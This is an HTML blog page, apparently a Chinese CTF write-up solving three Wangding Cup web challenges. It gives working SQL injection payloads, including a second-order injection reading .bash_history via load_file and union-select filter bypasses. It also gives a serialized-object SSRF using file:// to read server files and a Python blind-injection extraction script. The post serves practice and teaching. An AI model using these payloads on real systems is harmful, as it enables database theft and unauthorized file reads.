@@ -1,0 +1,490 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>做几道网鼎杯 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/3.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="做几道网鼎杯">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-18 11:46" pubdate>
+        2021年8月18日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">做几道网鼎杯</h1>
+            
+            <div class="markdown-body">
+              <h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p>打开界面，跟着提交帖子发现要登陆，登陆界面最开始以为是直接注入呢，后来才注意到有提示<code>***</code>要爆破，爆破出来时666，登陆后正常提交帖子，然后好像就没啥了，想起来扫一下目录，扫到了git文件泄露，直接githack下载下来，git恢复了一下拿到源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>比较明显的二次注入，在<code>write</code>操作中将恶意<code>category</code>写入数据库，其实那个转义函数没什么用，因为存入数据库的还是原数据，后来在<code>comment</code>中直接调用了<code>category</code>，造成了二次注入。</p>
+<p>最开始试了正常的读取数据库但是没发现回显，后来读了下user()发现是root权限，那flag应该不在数据库，最后发现可以用<code>load_file</code></p>
+<p>来读bash命令记录。这个地方能读取也是建立在可读权限上的</p>
+<p>先写个帖子使<code>category = 1&#39;,content=(select load_file(&#39;/home/www/.bash_history&#39;)),/*</code>然后留言出<code>*/#</code>闭合就可以，</p>
+<p><img src="https://img-blog.csdnimg.cn/d6ff82be96b8453db7fd742e3f4f5587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>再读<code>.DS_Store</code> ，但需要hex编码一下，因为有不可见字符，接着读<code>flag_8946e1ff1ee3e40f.php</code>拿flag</p>
+<h1 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h1><p>进入页面发现尝试join，按要求输入了，然后创建了一个用户的样子，看了下源代码，发现一个链接<code>view.php?no=1</code>，感觉是注入的样子，点开正常界面，试了下no=2报错了，接着简单测试了下，用<code>union select</code>时返回了<code>no hack ~_~</code>，被ban了！这里应该就可以确定存在注入了，试了下内敛注释可以绕过。测试了下有四个字段<code>no=-1%20union/**/select%201,2,3,4#</code>，发现<code>username</code>处回显了2，接着就可以来得到表字段啥的了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(database()),3,4%20limit%200,1#     <br>回显fakebook<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1#              <br>回显users<br><br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%200,1#  			   	<br>回显no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS、<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(no,username,passwd,data),3,4%20from%20users%20limit%200,1#<br>回显1kkfineba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br><br>no:1<br>username:kkfine<br>passwd:ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413<br>data:O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>再看到这个序列化数据猜到和反序列化有关，到这卡了一下不知道干啥了，然后想起来目录还没扫，发现有robots.txt中有给出了bak文件，拿到源码分析，</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>很明显data的数据就是这个<code>UserInfo</code>类，内容就是我们之前注册用户的数据，然后这里需要联想一下，,因为源码里面很明显要SSRF打内网，这里又需要序列化，结合报错消息<code>**Notice**: unserialize(): Error at offset 0 of 1 bytes in **/var/www/html/view.php** on line **31**</code>想到的就是可以用select查询我们构造的data数据，去执行<code>getBlogContents ()</code>来达到SSRF。构造<code>O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1 union&#x2F;**&#x2F;select  1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;<br><br>拿到flag<br>&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxZmE2ZDUzOS0xZTUyLTQyZjctYTk4NS1mMDZhOTU1NWQ0MmR9IjsNCmV4aXQoMCk7DQo&#x3D;&#39;&gt;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h1><p>进入界面是一个登录，也没有给注册按钮，那就先扫目录吧，果然扫出来了个<code>register.php</code>，注册界面是需要邮箱，用户名，密码，但登录界面只需要用邮箱和密码，登录进去后回显出来了用户名，似乎又是二次注入。</p>
+<p>测试了一下，发现过滤掉了<code>, information</code>等，那left，right函数就用不了了，这里有两个思路，一个是使用hex二次编码，二次编码后的长度太长了，再用<code>from for</code>截取来爆破出想要得到的结果，转码就行了。另个一使用ascii加上</p>
+<p>测试pyload<code>0&#39;+ascii(substr(databases()) from 1 for 1)+&#39;0;</code></p>
+<p>0’+ascii(substr((select * from flag) from {} for 1))+’0;</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://5a23b673-9495-4dec-b80c-5cf3bf553d2f.node4.buuoj.cn:81/&#x27;</span><br>s = string.ascii_letters+string.ascii_uppercase+string.digits<br>ses = requests.session()<br>repatter = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;span class=&quot;user-name&quot;&gt;[\s]+([\w]+)[\s]+&lt;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        resister_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>        <span class="hljs-comment"># payload = &quot;0&#x27;+ascii(substr((select database()) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i)       #数据库为web</span><br>        payload = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        resister_res = requests.post(resister_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                        <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>                                                        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        <span class="hljs-comment"># print(resister_res)</span><br>        login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>        loginres = requests.post(login_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                  <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        content = re.findall(repatter,loginres)<br>        result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(content[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(result)  <span class="hljs-comment">#flag&#123;e3fd3970-c860-4e90-b4ed-189491a9047f&#125;</span><br>exp()<br><br>另一种用<span class="hljs-number">0</span><span class="hljs-string">&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;</span><span class="hljs-number">0</span> 原理也是差不多的<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>总结一下，这几个题大都考的是注入，穿插了一下其他的考点像序列化然后ssrf，再次熟悉了二次注入的原理及可能出现的地方，不得不说这几个题目还不错。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web/">web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/11/2021-8-10-pickle%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/">
+                        <span class="hidden-mobile">pickle学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
